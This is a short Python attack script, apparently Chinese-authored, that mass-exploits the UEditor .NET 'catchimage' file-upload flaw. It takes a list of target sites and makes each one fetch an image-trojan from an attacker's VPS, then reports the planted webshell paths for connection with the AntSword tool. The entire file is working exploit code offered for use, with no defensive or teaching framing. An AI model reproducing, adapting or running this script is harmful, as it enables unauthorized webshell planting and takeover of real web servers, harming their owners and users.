import sys
import requests
import re


banner="""
 ______   _ _   _ _             
|  ____| (_) \ | (_)            
| |__ ___ _|  \| |_  __ _  ___  
|  __/ _ \ | . ` | |/ _` |/ _ \ 
| | |  __/ | |\  | | (_| | (_) |
|_|  \___|_|_| \_|_|\__,_|\___/ 
                version:1.0
"""

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

file_path = sys.argv[2]

file = open(file_path,'r',encoding='UTF-8').read().split()
muma = input("请输入VPS图片马的地址:")
payload = "source[]="

re_payload = "/controller.ashx?action=catchimage"

post_data = payload + muma

print(banner)

for i in file:
    urls = i +re_payload
    try:
        resp = requests.post(url=urls, data=post_data, headers=headers)
        r = re.findall(r'"url":"(.*?)"', resp.text)[0]
        webshell_path = i + "/" + r
        resp1 = requests.get(webshell_path)
        if "JFIF" in resp1.text:
            print("\033[0;32;40m[+] 存在ueditor文件上传漏洞,webshell地址为: {}\033[0m".format(webshell_path))
            print("\033[0;32;40m请使用蚁剑连接\033[0m")
            print("\n")
        else:
            print("访问目标webshell地址失败 {0} 状态码{1}".format(webshell_path,resp1.status_code))

    except Exception as e:
        print("url:{} 请求失败".format(i))



